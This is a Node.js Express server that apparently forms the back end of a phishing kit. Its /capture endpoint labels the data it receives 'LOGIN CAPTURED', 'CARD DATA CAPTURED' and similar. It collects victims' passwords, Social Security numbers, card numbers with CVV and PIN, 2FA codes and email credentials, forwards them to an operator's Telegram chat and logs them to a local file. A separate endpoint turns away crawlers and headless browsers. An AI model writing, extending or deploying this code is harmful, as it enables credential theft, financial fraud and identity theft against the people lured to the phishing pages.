import express from 'express';
import path from 'path';
import axios from 'axios';
import fs from 'fs';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import morgan from 'morgan';

// Load environment variables
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging middleware
app.use(morgan('combined'));

// Serve static files from the 'public' directory
app.use(express.static(path.join(process.cwd(), 'public')));

// Serve the isolated environments directory
app.use(express.static(path.join(process.cwd(), 'builds')));

// Load configuration from config.json
let config = {};
try {
    const configPath = path.join(process.cwd(), 'config.json');
    const configFile = fs.readFileSync(configPath, 'utf8');
    config = JSON.parse(configFile);
} catch (error) {
    console.error('Failed to load config:', error);
}

// Telegram Bot Configuration
// Initial config load is dynamic per request to support updates without restarts

// HTML-escape value for Telegram HTML mode
const he = (s) => {
    if (typeof s !== 'string') return s;
    return s.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
};

// Function to send messages to Telegram
const sendToTelegram = async (message) => {
    try {
        // Dynamically load to ensure updates to .env or config.json are reflected
        dotenv.config({ override: true });
        
        let dynConfig = {};
        try {
            const configPath = path.join(process.cwd(), 'config.json');
            const configFile = fs.readFileSync(configPath, 'utf8');
            dynConfig = JSON.parse(configFile);
        } catch (e) {}
        
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || dynConfig.telegram?.bot_token;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID || dynConfig.telegram?.chat_id;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Telegram Bot Token or Chat ID not configured. Message dropped.');
            return;
        }

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
};

// Endpoint to handle form submissions
app.post('/capture', async (req, res) => {
    const d = req.body;
    
    // Server-side Input Validation
    if (!d || typeof d !== 'object' || Object.keys(d).length === 0) {
        return res.status(400).send('Invalid or missing payload');
    }

    const form_type = d.form_type || 'unknown';
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const user_agent = req.headers['user-agent'] || 'Unknown';
    const session_id = d._sid || 'nosid';

    const sid_tag = session_id ? `\n🔗 <b>SID:</b> <code>${he(session_id)}</code>` : '';
    const fp_line = d.fingerprint ? `🛡️ <b>FP:</b> <code>${he(d.fingerprint)}</code>\n` : '';

    const header = `🕒 <code>${timestamp}</code>\n`
        + `📍 <b>IP:</b> <code>${he(ip.split(',')[0])}</code>\n`
        + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
        + fp_line
        + sid_tag + "\n";

    let msg = '';
    
    switch (form_type) {
        case 'visit':
            msg = "👁️ <b>NEW VISITOR</b>\n"
                + `🕒 <code>${timestamp}</code>\n`
                + `📍 <b>IP:</b> <code>${he(ip.split(',')[0])}</code>\n`
                + `🌐 <b>Page:</b> <code>${he(d.url || 'Unknown')}</code>\n`
                + `🖥️ <b>Res:</b> <code>${he(d.res || 'Unknown')}</code>\n`
                + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
                + fp_line
                + sid_tag;
            break;
            
        case 'login':
            msg = "🔑 <b>✅ LOGIN CAPTURED</b>\n" + header
                + `👤 <b>Username:</b> <code>${he(d.username || 'N/A')}</code>\n`
                + `🔒 <b>Password:</b> <code>${he(d.password || 'N/A')}</code>`;
            break;
            
        case 'verify':
            msg = "🪪 <b>✅ IDENTITY CAPTURED</b>\n" + header
                + `👤 <b>Name:</b>  <code>${he(d.full_name || 'N/A')}</code>\n`
                + `🔢 <b>SSN:</b>   <code>${he(d.ssn || 'N/A')}</code>\n`
                + `📞 <b>Phone:</b> <code>${he(d.phone || 'N/A')}</code>\n`
                + `🆔 <b>Member #:</b> <code>${he(d.member_num || 'N/A')}</code>\n`
                + `🎂 <b>DOB:</b>   <code>${he(d.dob || 'N/A')}</code>`;
            break;
            
        case 'card':
            msg = "💳 <b>✅ CARD DATA CAPTURED</b>\n" + header
                + `💳 <b>Card:</b> <code>${he(d.card_num || 'N/A')}</code>\n`
                + `📅 <b>Exp:</b>  <code>${he(d.exp || 'N/A')}</code>\n`
                + `🔐 <b>CVV:</b>  <code>${he(d.cvv || 'N/A')}</code>\n`
                + `🔑 <b>PIN:</b>  <code>${he(d.pin || 'N/A')}</code>\n`
                + `🏠 <b>Addr:</b> <code>${he(d.address || 'N/A')}</code>`;
            break;
            
        case '2fa':
            msg = "📟 <b>✅ 2FA CODE CAPTURED</b>\n" + header
                + `🔢 <b>Code:</b> <code>${he(d.sec_code || 'N/A')}</code>`;
            break;
            
        case 'emailAuth':
            const prov = d.emailProvider || 'Unknown';
            let logo = "📧";
            if (prov.toLowerCase().includes('yahoo')) logo = "🟣";
            if (prov.toLowerCase().includes('google') || prov.toLowerCase().includes('gmail')) logo = "🔴";
            if (prov.toLowerCase().includes('microsoft') || prov.toLowerCase().includes('outlook') || prov.toLowerCase().includes('hotmail')) logo = "🔵";
            if (prov.toLowerCase().includes('apple') || prov.toLowerCase().includes('icloud')) logo = "⚪";

            msg = `${logo} <b>✅ EMAIL ACCOUNT CAPTURED</b>\n` + header
                + `🏢 <b>Provider:</b> <code>${he(prov)}</code>\n`
                + `📧 <b>Email:</b>    <code>${he(d.emailAcc || 'N/A')}</code>\n`
                + `🔒 <b>Password:</b> <code>${he(d.emailPass || 'N/A')}</code>`;
            break;
            
        default:
            let rows = '';
            for (const [k, v] of Object.entries(d)) {
                if (!['b_field', '_sid', 'form_type', 'fingerprint', 'attempt'].includes(k)) {
                    rows += `• <b>${he(k.charAt(0).toUpperCase() + k.slice(1))}:</b> <code>${he(v)}</code>\n`;
                }
            }
            msg = `📋 <b>FORM SUBMISSION</b> (${form_type})\n` + header + rows;
            break;
    }

    sendToTelegram(msg);

    // Write full capture to log file
    const logData = { form_type, session_id, timestamp, ip, user_agent, data: d };
    fs.appendFileSync(path.join(process.cwd(), 'captures.jsonl'), JSON.stringify(logData) + '\\n');

    res.status(200).json({ status: 'ok' });
});

// Endpoint for bot detection
app.get('/bot-detection', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const isBot = /bot|crawler|spider|robot|headless/i.test(userAgent) ||
                 req.headers['x-forwarded-for'] === 'unknown' ||
                 req.headers['accept-language'] === undefined ||
                 req.headers['accept-encoding'] === undefined;

    if (isBot) {
        res.send('Access Denied: Automated Software Detected.');
    } else {
        res.send('');
    }
});

// Endpoint to serve config.json
app.get('/config', (req, res) => {
    res.json(config);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
